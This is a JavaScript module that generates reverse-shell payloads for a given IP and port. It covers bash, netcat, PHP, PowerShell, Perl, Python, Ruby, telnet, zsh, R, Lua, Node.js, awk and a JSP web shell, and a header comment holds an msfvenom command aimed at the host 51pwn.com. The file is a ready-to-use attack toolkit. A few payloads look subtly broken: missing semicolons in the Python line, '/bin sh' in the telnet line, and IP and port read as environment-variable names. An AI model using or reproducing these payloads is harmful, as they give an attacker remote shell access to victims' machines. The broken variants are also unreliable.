/*
cat reverse.txt|awk '{print $1}'|grep reverse|grep 'shell'

msfvenom -p nodejs/shell_reverse_tcp LHOST=51pwn.com LPORT=887

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
*/
module.exports={ getCode:function(s,p){
	var values={"port":p,"ip":s};
	return {
	bash_rshell: `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`,
	netcat_rshell:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f`,
	php_rshell:`php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`,
	PS_rshell:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
	perl_rshell:`perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
	python_rshell:`python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv("${values.ip}"),int(os.getenv("${values.port}"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn("/bin/sh")'`,
	ruby_rshell:`ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${values.ip}"],ENV["${values.port}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
	telnet_rshell:`TF=$(mktemp -u); mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin sh 1>$TF`,
	zsh_rshell:`zsh -c 'zmodload zsh/net/tcp && ztcp ${values.ip} ${values.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
	'r/shell_reverse_tcp':`s<-socketConnection(host='${values.ip}',port=${values.port},blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines(pipe(readLines(s, 1))),s)}`,
	'cmd/unix/reverse_lua':`lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('${values.ip}',${values.port});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"`,
	'nodejs/shell_reverse_tcp':`(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(${values.port}, "${values.ip}", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();`,
	'nodejs/shell_reverse_tcp_ssl':`(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("tls"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(${values.port}, "${values.ip}", {rejectUnauthorized:false}, function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();`,
	'cmd/unix/reverse_awk':`awk 'BEGIN{s="/inet/tcp/0/${values.ip}/${values.port}";do{if((s|&getline c)<=0)break;if(c){while((c|&getline)>0)print $0|&s;close(c)}} while(c!="exit")close(s)}'`,
	'java/jsp_shell_reverse_tcp':`<%@page import="java.lang.*"%>
	<%@page import="java.util.*"%>
	<%@page import="java.io.*"%>
	<%@page import="java.net.*"%>
	
	<%
	  class StreamConnector extends Thread
	  {
		InputStream zP;
		OutputStream l7;
	
		StreamConnector( InputStream zP, OutputStream l7 )
		{
		  this.zP = zP;
		  this.l7 = l7;
		}
	
		public void run()
		{
		  BufferedReader tC  = null;
		  BufferedWriter uYY = null;
		  try
		  {
			tC  = new BufferedReader( new InputStreamReader( this.zP ) );
			uYY = new BufferedWriter( new OutputStreamWriter( this.l7 ) );
			char buffer[] = new char[8192];
			int length;
			while( ( length = tC.read( buffer, 0, buffer.length ) ) > 0 )
			{
			  uYY.write( buffer, 0, length );
			  uYY.flush();
			}
		  } catch( Exception e ){}
		  try
		  {
			if( tC != null )
			  tC.close();
			if( uYY != null )
			  uYY.close();
		  } catch( Exception e ){}
		}
	  }
	
	  try
	  {
		String ShellPath;
	if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
	  ShellPath = new String("/bin/sh");
	} else {
	  ShellPath = new String("cmd.exe");
	}
	
		Socket socket = new Socket( "${values.ip}", ${values.port} );
		Process process = Runtime.getRuntime().exec( ShellPath );
		( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
		( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
	  } catch( Exception e ) {}
	%>`
	};
}};
// console.log(o)
